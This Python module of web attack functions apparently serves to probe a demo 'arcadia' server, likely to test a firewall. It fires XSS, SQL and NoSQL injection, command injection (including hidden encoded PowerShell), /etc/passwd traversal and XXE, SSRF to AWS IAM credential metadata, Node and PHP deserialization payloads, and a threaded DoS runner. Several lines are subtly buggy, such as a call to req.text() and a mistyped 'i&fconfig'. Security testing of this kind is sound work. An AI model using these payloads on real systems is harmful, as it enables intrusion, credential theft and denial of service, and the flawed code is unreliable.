"""Attack library functions."""

import requests
import threading
import re

blind_sql_payload = "AND SELECT SUBSTRING(column_name,1,1) FROM information_schema.columns > 'A'"
nosql_payload = "{$where: function() { return db.getCollectionNames(); }}"
insecure_deserialization_node_payload = "_$$ND_FUNC$$_function (){require('child_process').exec('ls /', " \
                                        "function(error, stdout, stderr) { console.log(stdout) });}()"
insecure_deserialization_php_payload = "O:6:\" attack \":3:{s:4:\" file \";s:9:\" shell.php \";s:4:\" data " \
                                       "\";s:19:\" <  ? php phpinfo();?  > \";}"


def cross_script_attack(pub_ip, secure=False):
    """Cross scripting attack via params."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + '?<script>var a = 1;</script>', verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + '?<script>var a = 1;</script>')
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_url(pub_ip, secure=False):
    """Cross scripting attack via url."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + '/<script>var a = 1;</script>', verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + '/<script>var a = 1;</script>')
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_header(pub_ip, secure=False):
    """Cross scripting attack via header."""
    if secure:
        req1 = requests.get(url='https://' + str(pub_ip), headers={"Host": "<script>var a = 1;</script>"}, verify=False)
    else:
        req1 = requests.get(url='http://' + str(pub_ip), headers={"Host": "<script>var a = 1;</script>"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_mouse_over_param(pub_ip, secure=False):
    """Cross scripting attack using mouse over code and using params field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "?onmouseover='var a=1;'", verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "? onmouseover='var a=1;'")
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_mouse_over_url(pub_ip, secure=False):
    """Cross scripting attack using mouse over code and using url field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "/onmouseover='var a=1;", verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "/onmouseover='var a=1;")
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_mouse_over_headers(pub_ip, secure=False):
    """Cross scripting attack using mouse over code and using headers field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip), headers={"Host": "onmouseover='var a=1;"}, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip), headers={"Host": "onmouseover='var a=1;"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_eval_param(pub_ip, secure=False):
    """Cross scripting attack using eval code and using params field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "?x=eval;x(1)", verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "?x=eval;x(1)")
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_eval_url(pub_ip, secure=False):
    """Cross scripting attack using eval code and using url field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "/x=eval;x(1)", verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "/x=eval;x(1)")
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def cross_script_attack_eval_headers(pub_ip, secure=False):
    """Cross scripting attack using eval code and using headers field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip), headers={"Host": "x=eval;x(1)"}, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip), headers={"Host": "x=eval;x(1)"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def sql_injection_attack(pub_ip, secure=False):
    """SQL injection attack."""
    values = {'username': "' or 1=1 --",
              'password': ' '}
    if secure:
        url1 = 'https://' + str(pub_ip) + '/trading/login.php'
        req1 = requests.post(url1, data=values, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '/trading/login.php'
        req1 = requests.post(url1, data=values)
    return req1.text


def sql_injection_attack_union_param(pub_ip, secure=False):
    """SQL injection attack using union code and using params field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "?9999999 UNION SELECT 1,2", verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "?9999999 UNION SELECT 1,2")
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def sql_injection_attack_union_url(pub_ip, secure=False):
    """SQL injection attack using union code and using url field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "/9999999 UNION SELECT 1,2", verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "/9999999 UNION SELECT 1,2")
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def sql_injection_attack_union_headers(pub_ip, secure=False):
    """SQL injection attack using union code and using headers field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip), headers={"Host": "9999999 UNION SELECT 1,2"}, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip), headers={"Host": "9999999 UNION SELECT 1,2"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def sql_injection_attack_blind_param(pub_ip, secure=False):
    """SQL injection attack using blind code and using params field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "?" + blind_sql_payload, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "?" + blind_sql_payload)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def sql_injection_attack_blind_url(pub_ip, secure=False):
    """SQL injection attack using blind code and using url field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "/"+blind_sql_payload, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "/"+blind_sql_payload)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def sql_injection_attack_blind_headers(pub_ip, secure=False):
    """SQL injection attack using blind code and using headers field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip), headers={"Host": blind_sql_payload}, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip), headers={"Host": blind_sql_payload})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def nosql_injection_attack_param(pub_ip, secure=False):
    """No SQL injection attack using params field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "?" + nosql_payload, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "?" + nosql_payload)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def nosql_injection_attack_url(pub_ip, secure=False):
    """No SQL injection attack using url field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip) + "/" + nosql_payload, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip) + "/" + nosql_payload)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def nosql_injection_attack_headers(pub_ip, secure=False):
    """No SQL injection attack using headers field."""
    if secure:
        req1 = requests.get('https://' + str(pub_ip), headers={"Host": nosql_payload}, verify=False)
    else:
        req1 = requests.get('http://' + str(pub_ip), headers={"Host": nosql_payload})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def command_injection_attack(pub_ip, secure=False):
    """Command injection attack."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '/&ifconfig -a'
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '/&ifconfig -a'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def command_injection_attack_param(pub_ip, secure=False):
    """Command injection attack."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '?i&fconfig -a'
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '?&ifconfig -a'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def command_injection_attack_header(pub_ip, secure=False):
    """Command injection attack."""
    if secure:
        url1 = 'https://' + str(pub_ip)
        req1 = requests.get(url1, headers={"Host": "ifconfig -a"}, verify=False)
    else:
        url1 = 'http://' + str(pub_ip)
        req1 = requests.get(url1, headers={"Host": "ifconfig -a"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def command_injection_attack_powershell_url(pub_ip, secure=False):
    """Command injection attack using powershell and url param."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '/%26%20powershell-WindowStyle%20Hidden%20-encod'
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '/%26%20powershell-WindowStyle%20Hidden%20-encod'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def command_injection_attack_powershell_param(pub_ip, secure=False):
    """Command injection attack using powershell and param field."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '?%26%20powershell-WindowStyle%20Hidden%20-encod'
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '?%26%20powershell-WindowStyle%20Hidden%20-encod'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def command_injection_attack_powershell_header(pub_ip, secure=False):
    """Command injection attack usinf powershell and header field."""
    if secure:
        url1 = 'https://' + str(pub_ip)
        req1 = requests.get(url1, headers={"Host": "%26%20powershell-WindowStyle%20Hidden%20-encod"}, verify=False)
    else:
        url1 = 'http://' + str(pub_ip)
        req1 = requests.get(url1, headers={"Host": "%26%20powershell-WindowStyle%20Hidden%20-encod"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def directory_traversal_attack(pub_ip, secure=False):
    """Directory traversal attack."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '/?file=../../'
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '/?file=../../'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def directory_traversal_attack_header(pub_ip, secure=False):
    """Directory traversal attack with header field."""
    if secure:
        url1 = 'https://' + str(pub_ip)
        req1 = requests.get(url1, headers={"Host": "../../etc/passwd"}, verify=False)
    else:
        url1 = 'http://' + str(pub_ip)
        req1 = requests.get(url1, headers={"Host": "../../etc/passwd"})
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def predictable_attack(pub_ip, secure=False):
    """Predictable attack."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '/backup'
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + '/backup'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def compliance_attack(pub_ip, secure=False):
    """Compliance attack with param field."""
    if secure:
        url1 = 'https://' + str(pub_ip) + r"?exploit.php\u0000.jpg"
        req1 = requests.get(url1, verify=False)
    else:
        url1 = 'http://' + str(pub_ip) + r'?exploit.php\u0000.jpg'
        req1 = requests.get(url1)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def evasion_attack(pub_ip, secure=False):
    """Evasion attack with param field."""
    if secure:
        url1 = 'https://' + str(pub_ip) + '?test.aspx::$DATA'
        req1 = requests.get(url1, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '?test.aspx::$DATA'
        req1 = requests.get(url)
    if req1.status_code != 200:
        return "not able to access arcadia server!"
    return req1.text


def ssrf_attack_aws(pub_ip, secure=False):
    """SSRF attack with param field."""
    if secure:
        url = 'https://' + str(pub_ip) + '?http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '?http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name'
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def insecure_deserialization_attack(pub_ip, secure=False):
    """Check Insecure Deserialization attack using url."""
    if secure:
        url = 'https://' + str(pub_ip) + '?' + insecure_deserialization_node_payload
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '?' + insecure_deserialization_node_payload
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def insecure_deserialization_attack_url(pub_ip, secure=False):
    """Check Insecure Deserialization attack using url."""
    if secure:
        url = 'https://' + str(pub_ip) + '/' + insecure_deserialization_node_payload
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '/' + insecure_deserialization_node_payload
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def insecure_deserialization_attack_headers(pub_ip, secure=False):
    """Check Insecure Deserialization attack using header."""
    if secure:
        url = 'https://' + str(pub_ip)
        req = requests.get(url, headers={"Host": insecure_deserialization_node_payload})
    else:
        url = 'http://' + str(pub_ip)
        req = requests.get(url, headers={"Host": insecure_deserialization_node_payload})
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def insecure_deserialization_attack_php_param(pub_ip, secure=False):
    """Check Insecure Deserialization attack using param."""
    if secure:
        url = 'https://' + str(pub_ip) + '?' + insecure_deserialization_php_payload
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '?' + insecure_deserialization_php_payload
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def insecure_deserialization_attack_php_url(pub_ip, secure=False):
    """Check Insecure Deserialization attack using url."""
    if secure:
        url = 'https://' + str(pub_ip) + '/' + insecure_deserialization_php_payload
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '/' + insecure_deserialization_php_payload
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def insecure_deserialization_attack_php_header(pub_ip, secure=False):
    """Check Insecure Deserialization attack using header."""
    if secure:
        url = 'https://' + str(pub_ip)
        req = requests.get(url, headers={"Host": insecure_deserialization_php_payload}, verify=False)
    else:
        url = 'http://' + str(pub_ip)
        req = requests.get(url, headers={"Host": insecure_deserialization_php_payload})
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def xml_external_entity(pub_ip, secure=False):
    """XML external attack."""
    if secure:
        url = 'https://' + str(pub_ip) + '/?file=<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ' \
                                         '"file:////etc/passwd">]><foo>&xxe;</foo>'
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '/?file=<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM ' \
                                        '"file:////etc/passwd">]><foo>&xxe;</foo>'
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def file_inclusion_attack(pub_ip, secure=False):
    """File inclusion attack."""
    if secure:
        url = 'https://' + str(pub_ip) + '/?file=../../abc.txt'
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '/?file=../../abc.txt'
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def code_injection_attack(pub_ip, secure=False):
    """Code injection attack."""
    if secure:
        url = "https://" + str(pub_ip) + "/?attack=exec('ls -l');"
        req = requests.get(url, verify=False)
    else:
        url = "http://" + str(pub_ip) + "/?attack=exec('ls -l');"
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def csrf(pub_ip, secure=False):
    """CSRF attack."""
    if secure:
        url = 'https://' + str(pub_ip) + '?http://' + str(pub_ip) + '/trading/index.php'
        req = requests.get(url, verify=False)
    else:
        url = 'http://' + str(pub_ip) + '?http://' + str(pub_ip) + '/trading/index.php'
        req = requests.get(url)
    if req.status_code != 200:
        return "not able to access arcadia server!"
    return req.text


def attack(pub_ip, secure=False):
    """Attack script."""
    if secure:
        req = requests.get('https://'+str(pub_ip), verify=False)
    else:
        req = requests.get('http://'+str(pub_ip))
    if "support ID" in req.text():
        print("DoS", re.search("support ID is: [0-9]+", req.text).group())


def attack_runner(pub_ip, secure=False):
    """DOS attack script."""
    for i in range(5):
        assert i < 5
        thread = threading.Thread(target=attack, args=(pub_ip, secure))
        thread.start()
